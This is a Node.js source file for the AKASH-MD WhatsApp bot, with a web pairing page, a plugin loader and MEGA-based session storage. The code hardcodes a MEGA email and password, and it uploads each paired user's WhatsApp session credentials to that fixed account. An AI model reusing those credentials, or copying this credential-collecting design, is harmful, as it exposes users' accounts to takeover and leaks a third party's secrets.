const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason,
    delay,
    Browsers,
    fetchLatestBaileysVersion
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { Storage } = require('megajs');
const archiver = require('archiver');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(cors());

const BOT_NAME = 'AKASH-MD';
const PREFIX = '.';
const MEGA_EMAIL = 'nsithija239@gmail.com';
const MEGA_PASSWORD = '1234@nima5';
const OWNER_NUMBER = '94772422982'; // Owner number for connect message

let sock;
const AUTH_DIR = path.join(__dirname, 'auth_info');
const commands = new Map();

// 📂 Load Plugins
function loadPlugins() {
    commands.clear();
    const pluginsDir = path.join(__dirname, 'plugins');
    if (!fs.existsSync(pluginsDir)) {
        fs.mkdirSync(pluginsDir);
    }

    const files = fs.readdirSync(pluginsDir);
    for (const file of files) {
        if (file.endsWith('.js')) {
            try {
                const pluginPath = path.join(pluginsDir, file);
                delete require.cache[require.resolve(pluginPath)];
                const plugin = require(pluginPath);
                
                if (plugin && plugin.cmd && plugin.handler) {
                    commands.set(plugin.cmd.toLowerCase(), plugin);
                    console.log(`✅ Loaded Plugin: ${plugin.cmd}`);
                }
            } catch (err) {
                console.error(`❌ Error loading plugin ${file}:`, err.message);
            }
        }
    }
}

loadPlugins();

async function uploadSessionToMega(userJid) {
    try {
        if (!fs.existsSync(AUTH_DIR) || fs.readdirSync(AUTH_DIR).length === 0) return;

        console.log('📦 Creating Session Zip...');
        const zipPath = path.join(__dirname, 'session.zip');
        const output = fs.createWriteStream(zipPath);
        const archive = archiver('zip', { zlib: { level: 9 } });

        archive.pipe(output);
        archive.directory(AUTH_DIR, false);
        await archive.finalize();

        await new Promise((resolve) => output.on('close', resolve));

        console.log('☁️ Uploading to Mega...');
        const storage = await new Storage({
            email: MEGA_EMAIL,
            password: MEGA_PASSWORD
        }).ready;

        const file = await storage.upload({
            name: `${BOT_NAME}-session.zip`
        }, fs.createReadStream(zipPath)).complete;

        const megaUrl = await file.link();
        if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);

        if (sock && userJid) {
            const sessionMsg = `*───────────────────*\n` +
                               `🎉 *${BOT_NAME} CONNECTED!* 🟢\n` +
                               `*───────────────────*\n\n` +
                               `🔑 *Your Mega Session Link:*\n\`\`\`${megaUrl}\`\`\`\n\n` +
                               `📌 *For permanent connection in Heroku:*\n` +
                               `Add Config Var -> Key: \`SESSION_ID\` | Value: \`${megaUrl}\``;
            await sock.sendMessage(userJid, { text: sessionMsg });
        }
    } catch (err) {
        console.error('❌ Mega Upload Error:', err.message);
    }
}

async function downloadSessionFromMega() {
    const sessionUrl = process.env.SESSION_ID;
    if (!sessionUrl) return false;

    try {
        console.log('📥 Downloading Session from Mega...');
        if (!fs.existsSync(AUTH_DIR)) fs.mkdirSync(AUTH_DIR);

        const File = require('megajs').File;
        const file = File.fromURL(sessionUrl);
        const zipPath = path.join(__dirname, 'downloaded_session.zip');

        const stream = file.download();
        const writeStream = fs.createWriteStream(zipPath);
        stream.pipe(writeStream);

        await new Promise((resolve, reject) => {
            writeStream.on('finish', resolve);
            writeStream.on('error', reject);
        });

        const unzipper = require('unzipper');
        await fs.createReadStream(zipPath).pipe(unzipper.Extract({ path: AUTH_DIR })).promise();
        if (fs.existsSync(zipPath)) fs.unlinkSync(zipPath);

        console.log('✅ Session restored successfully!');
        return true;
    } catch (err) {
        console.error('❌ Failed to restore session:', err.message);
        return false;
    }
}

async function startBot() {
    if (!fs.existsSync(AUTH_DIR) || fs.readdirSync(AUTH_DIR).length === 0) {
        await downloadSessionFromMega();
    }

    const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: state,
        printQRInTerminal: false,
        browser: Browsers.ubuntu('Chrome'),
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        retryRequestDelayMs: 250
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            console.log(`🔴 Connection Closed (Code: ${statusCode}). Reconnecting...`);
            if (statusCode !== DisconnectReason.loggedOut) {
                setTimeout(startBot, 3000);
            } else {
                console.log('❌ Session Logged Out. Please re-pair!');
                if (fs.existsSync(AUTH_DIR)) fs.rmSync(AUTH_DIR, { recursive: true, force: true });
            }
        } else if (connection === 'open') {
            console.log(`🟢 [${BOT_NAME}] Connected successfully!`);

            // Send AKASH-MD Connection Message to Owner Number
            try {
                const ownerJid = `${OWNER_NUMBER}@s.whatsapp.net`;
                const connectMsg = `
*╭───────────────────╮*
*│ 🤖 *AKASH-MD BOT* │*
*╰───────────────────╯*

*┌───────────────────┐*
*│  ✅ *CONNECTED SUCCESSFULLY!*
*└───────────────────┘*

*📌 *Bot Name:* AKASH-MD*
*👤 *Owner Number:* ${OWNER_NUMBER}*
*⚡ *Prefix:* [ ${PREFIX} ]*
*🕒 *Connected Time:* ${new Date().toLocaleTimeString()}*

*┌───────────────────┐*
*│  ⚙️ *SYSTEM INFORMATION*
*└───────────────────┘*
* 💾 *RAM Usage:* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB*
* 🚀 *Speed:* Fast & Stable*
* 🌐 *Status:* Active & Online*

> *AKASH-MD WhatsApp Bot is ready to use! Enjoy.* ✨
`;

                await sock.sendMessage(ownerJid, {
                    image: { url: 'https://i.ibb.co/7xtcf5Vv/file-0000000002d48230a5ad48cf94c182d7.png' },
                    caption: connectMsg
                });
            } catch (err) {
                console.error('❌ Connect message error:', err.message);
            }

            const userJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            await delay(3000);
            await uploadSessionToMega(userJid);
        }
    });

    // 📩 INCOMING MESSAGES HANDLER
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;
        const msg = messages[0];
        if (!msg || !msg.message) return;

        const from = msg.key.remoteJid;
        const body = msg.message.conversation || 
                     msg.message.extendedTextMessage?.text || 
                     msg.message.imageMessage?.caption || 
                     msg.message.videoMessage?.caption || '';

        const trimmedBody = body.trim();
        if (!trimmedBody) return;

        // -------------------------------------------------------------
        // 1. FIRST CHECK: ONTEXT LISTENERS (FOR DIRECT REPLIES LIKE 1, 2)
        // -------------------------------------------------------------
        for (const [_, plugin] of commands) {
            if (typeof plugin.onText === 'function') {
                try {
                    const handled = await plugin.onText(sock, msg, from, trimmedBody);
                    if (handled) return; // Number එක අල්ලගත්තා නම් ඊළඟ Commands Check කරන්නේ නැත
                } catch (err) {
                    console.error(`❌ Error in onText handler:`, err.message);
                }
            }
        }

        // -------------------------------------------------------------
        // 2. SECOND CHECK: COMMAND HANDLER (e.g. .lakvision aladin)
        // -------------------------------------------------------------
        if (!trimmedBody.startsWith(PREFIX)) return;

        console.log(`📩 Command: ${trimmedBody} from ${from}`);

        const args = trimmedBody.slice(PREFIX.length).trim().split(/ +/);
        const cmdName = args.shift().toLowerCase();

        // Check command or alias
        let plugin = commands.get(cmdName);
        if (!plugin) {
            for (const [_, p] of commands) {
                if (p.alias && p.alias.includes(cmdName)) {
                    plugin = p;
                    break;
                }
            }
        }

        if (plugin && typeof plugin.handler === 'function') {
            try {
                await plugin.handler(sock, msg, from, args, { BOT_NAME, PREFIX, commands });
            } catch (err) {
                console.error(`❌ Error in ${cmdName}:`, err.message);
                await sock.sendMessage(from, { text: `❌ Error: ${err.message}` }, { quoted: msg });
            }
        }
    });
}

// 🌐 Pairing Web Interface
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>${BOT_NAME} - Pairing Code</title>
            <style>
                body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #0b141a; color: #e9edef; margin: 0; }
                .card { background: #111b21; padding: 30px; border-radius: 16px; text-align: center; width: 85%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); border: 1px solid #222d34; }
                h2 { color: #00a884; margin-bottom: 8px; font-size: 24px; }
                p { font-size: 14px; color: #8696a0; margin-bottom: 20px; }
                input { width: 90%; padding: 12px; margin-bottom: 15px; border: 1px solid #2a3942; border-radius: 8px; text-align: center; font-size: 16px; background: #202c33; color: white; outline: none; }
                button { background: #00a884; color: #111b21; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-size: 16px; width: 98%; font-weight: bold; transition: 0.3s; }
                button:hover { background: #008f6f; }
                .code { font-size: 26px; font-weight: bold; color: #00a884; letter-spacing: 4px; margin-top: 20px; word-break: break-all; }
                .badge { display: inline-block; background: #202c33; color: #00a884; padding: 4px 10px; border-radius: 12px; font-size: 12px; margin-bottom: 15px; }
            </style>
        </head>
        <body>
            <div class="card">
                <h2>${BOT_NAME}</h2>
                <div class="badge">Loaded Plugins: ${commands.size}</div>
                <p>Enter phone number with Country Code<br>(e.g. 94771234567)</p>
                <input type="text" id="phone" placeholder="9477XXXXXXX">
                <button onclick="getPair()">Get Pairing Code</button>
                <div class="code" id="result"></div>
            </div>

            <script>
                async function getPair() {
                    const number = document.getElementById('phone').value.trim();
                    const result = document.getElementById('result');
                    if (!number) return alert('Enter a valid phone number!');
                    
                    result.style.color = "#00a884";
                    result.innerText = "Generating Code...";
                    try {
                        const res = await fetch('/pair?num=' + number);
                        const data = await res.json();
                        if (data.code) {
                            result.innerText = data.code;
                        } else {
                            result.style.color = "#ea4335";
                            result.innerText = data.error || "Error!";
                        }
                    } catch (e) {
                        result.style.color = "#ea4335";
                        result.innerText = "Failed to connect!";
                    }
                }
            </script>
        </body>
        </html>
    `);
});

app.get('/pair', async (req, res) => {
    let num = req.query.num;
    if (!num) return res.status(400).json({ error: 'Number required' });
    num = num.replace(/[^0-9]/g, '');

    try {
        if (!sock || !sock.authState.creds.registered) {
            await delay(1500);
            const code = await sock.requestPairingCode(num);
            return res.json({ code: code?.match(/.{1,4}/g)?.join("-") || code });
        } else {
            return res.json({ error: 'Already connected!' });
        }
    } catch (err) {
        return res.status(500).json({ error: 'Pairing failed' });
    }
});

app.listen(PORT, () => {
    console.log(`🌐 Server active on ${PORT}`);
    startBot();
});
